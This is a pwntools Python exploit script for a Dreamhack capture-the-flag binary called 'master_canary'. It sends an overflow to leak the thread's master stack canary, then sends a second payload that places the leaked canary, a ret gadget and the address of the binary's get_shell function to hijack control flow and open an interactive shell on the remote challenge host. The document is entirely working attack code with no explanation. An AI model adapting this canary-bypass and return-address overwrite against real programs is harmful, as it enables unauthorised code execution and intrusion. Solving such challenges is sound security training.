#!/usr/bin/env python3

from pwn import *

exe = ELF("./master_canary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14775)

    return r


def main():
    r = conn()

    r.sendlineafter("> ", b"1")
    r.sendlineafter("> ", b"2")

    payload = b"A" * 0x8e8                                          # padding
    payload += b"A"                                                 # lowest byte of master canary

    r.sendlineafter("Size: ", str(len(payload)).encode())
    r.sendafter("Data: ", payload)
    
    r.recvuntil(payload)
    master_canary = b"\x00" + r.recvn(7)

    r.sendlineafter("> ", b"3")

    rop = ROP(exe)
   
    payload = b"A" * 0x28                                           # padding
    payload += master_canary
    payload += b"A" * 0x8 
    payload += p64(rop.find_gadget(["ret"])[0])
    payload += p64(exe.symbols["get_shell"])
   
    r.sendafter("Leave comment: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
